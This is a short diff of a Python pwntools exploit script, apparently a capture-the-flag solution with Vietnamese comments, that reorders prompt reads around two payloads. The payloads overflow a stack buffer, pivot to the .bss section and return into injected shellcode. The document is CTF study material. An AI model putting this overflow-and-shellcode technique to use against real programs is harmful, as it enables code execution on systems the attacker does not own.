@@ -35,25 +35,21 @@ def exploit(p,elf,libc):
     bss_addr = 0x601500 # 0x601000 + 0x500  ==> 0x601000 -> dia chi bat dau cua .bss
 
 
-
+    p.recvuntil('Tell Santa what you want for XMAS\n')
     payload = "A"*40
     payload += p64(v5)
     payload += p64(bss_addr)
     payload += p64(main)
-
-
-    p.recvuntil('Tell Santa what you want for XMAS\n')
     p.sendline(payload)
 
-
+    
+    p.recvuntil('Tell Santa what you want for XMAS\n')
     bss_addr -= 0x30 # quay lai dinh cua buffer
     payload = shellcode
     payload += 'A'*13
     payload += p64(v5)
     payload += p64(bss_addr+0x30) # ebp  -> 1 gia tri bat ky
     payload += p64(bss_addr) # ret_ addr -> tro ve dinh stack
-
-    p.recvuntil('Tell Santa what you want for XMAS\n')
     p.sendline(payload)
 
 
